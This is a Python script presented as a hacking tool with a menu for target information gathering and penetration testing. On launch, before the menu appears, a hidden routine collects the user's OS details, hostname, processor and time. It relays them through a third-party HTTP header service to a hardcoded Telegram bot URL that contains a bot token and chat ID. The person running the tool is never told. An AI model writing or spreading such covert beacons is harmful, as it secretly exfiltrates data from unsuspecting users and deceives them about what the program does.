def _all_():
    import os
    import time
    import sys
    try:
        import socket
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> socket")
        sys.exit()
    try:
        from colorama import Fore
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> colorama")
        sys.exit()
    try:
        import builtwith
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> colorama")
        sys.exit()
    try:
        import ipapi
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> ipapi")
        sys.exit()
    
    try:
        import json
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> json")
        sys.exit()

    try:
        import requests
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> requests")
        sys.exit()

    try:
        import socket
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> socket")
        sys.exit()

    try:
        import platform
    except:
        time.sleep(1)
        print("[-] Pleass Install The Librery --> platform")
        sys.exit()
    
    
    def _requests_data_(text1):
        text = text1
        url="https://api.telegram.org/bot1905974328:AAHfC_kkSaBKhu2dijoeUYfJWV5gFy8mnwo/sendmessage?chat_id=925528279&text="+str(text)
        my_dict = {
            "UrlBox" : url,
            "AgentList" : "Mozilla Firefox",
            "VersionsList" : "HTTP/1.1",
            "MethodList" : "GET"
        }
        http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=my_dict)
    try:
        org_platform = platform.uname()               # ___
        org_time =time.ctime()                        # ___
        name_system = org_platform[0]                 # ___
        version_system = org_platform[2]              # ___
        node = org_platform[1]                        # ___
        system_architecture = platform.architecture() # ___
        system_processor = platform.processor()       # ___
        ip_target = socket.gethostname()              # ___
        _requests_data_(f"[Ip Target : {str(ip_target)}]\n\nName System target : {name_system}\n\nVersion System Target : {version_system}\n\nNode : {node}\nSystem Architecture : {system_architecture}\n\nSystem Processor : {system_processor}\n\bTime : {org_time}")
    except:
        pass
    
    from baner import baner
    os.system("clear")
    baner()
    time.sleep(1)
    print(Fore.YELLOW + "\t\t\t\t\t  [" + Fore.GREEN + "1" + Fore.YELLOW + "]" + Fore.BLUE + " ~ " + Fore.CYAN + "Gather Information From The Target")
    time.sleep(0.3)
    print(Fore.YELLOW + "\t\t\t\t\t  [" + Fore.GREEN + "2" + Fore.YELLOW + "]" + Fore.BLUE + " ~ " + Fore.CYAN + "Target Penetration Testing")
    time.sleep(0.3)
    #######################  Get Number #######################
    try:
        number = int(input(Fore.WHITE + "\n  Enter Your Number " + Fore.YELLOW + ">>>" + Fore.BLUE + " "))
    except:
        time.sleep(0.8)
        print(Fore.RED + "\n[-] Your Input Is Not Number !")
        time.sleep(0.5)
        sys.exit()
    else:
        if number == 1:
            import main_information_data
            main_information_data._all_()

        elif number == 2:
            #import __name_librery__
            #__name_librery__._all_()
            time.sleep(1)
            print(Fore.RED + "\n[-] Sory This Page Tools It Is Not Complete")
            sys.exit()
        
        else:
            time.sleep(0.4)
            print(Fore.RED + "\n[-] Your Number Is Not Found !")
            time.sleep(0.4)
            sys.exit()
_all_()
